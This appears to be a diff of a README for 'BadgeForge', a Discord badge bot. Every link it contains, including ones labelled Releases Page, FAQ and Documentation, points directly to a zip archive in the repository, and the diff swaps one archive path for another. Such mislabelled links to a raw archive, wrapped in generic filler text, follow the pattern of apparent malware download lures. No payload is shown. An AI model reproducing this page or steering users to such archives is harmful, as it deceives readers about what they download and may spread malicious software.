@@ -1,7 +1,7 @@
 # 🎨 BadgeForge - Create Stunning Badges for Discord Easily
 
 ## 📥 Download Now!
-[![Download BadgeForge](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip)](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip)
+[![Download BadgeForge](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip)](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to BadgeForge! This Discord bot helps you create beautiful badges in various styles with just a few simple commands. Whether you want to customize your profile or reward your friends, BadgeForge makes it easy.
@@ -13,7 +13,7 @@ Welcome to BadgeForge! This Discord bot helps you create beautiful badges in var
 
 ## 📦 Installation Steps
 1. **Visit the Download Page**  
-   To get started, visit the [BadgeForge Releases Page](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip). Here, you'll find the latest version of the bot available for download.
+   To get started, visit the [BadgeForge Releases Page](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip). Here, you'll find the latest version of the bot available for download.
 
 2. **Download the Latest Release**  
    Look for the most recent version and click on it. You will see files available for download. Choose the file that matches your operating system.
@@ -48,14 +48,14 @@ If you encounter any issues:
 - If the bot doesn’t respond to commands, check the bot’s permissions.
 
 ## 📞 Support
-For further assistance, please refer to the [FAQ](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip) for detailed information or open an issue on the GitHub page.
+For further assistance, please refer to the [FAQ](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip) for detailed information or open an issue on the GitHub page.
 
 ## 📄 License
 BadgeForge is licensed under the MIT License. Feel free to use and modify it according to the terms of the license.
 
 ## 🔗 Links
 For more details, visit:
-- [BadgeForge Releases Page](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip)
-- [Documentation](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip)
+- [BadgeForge Releases Page](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip)
+- [Documentation](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip)
 
-[![Download BadgeForge](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip)](https://raw.githubusercontent.com/tututdwitoto2703/BadgeForge/main/images/Forge_Badge_1.7-alpha.4.zip)
+[![Download BadgeForge](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip)](https://github.com/tututdwitoto2703/BadgeForge/raw/refs/heads/main/badge/Forge-Badge-v2.8.zip)
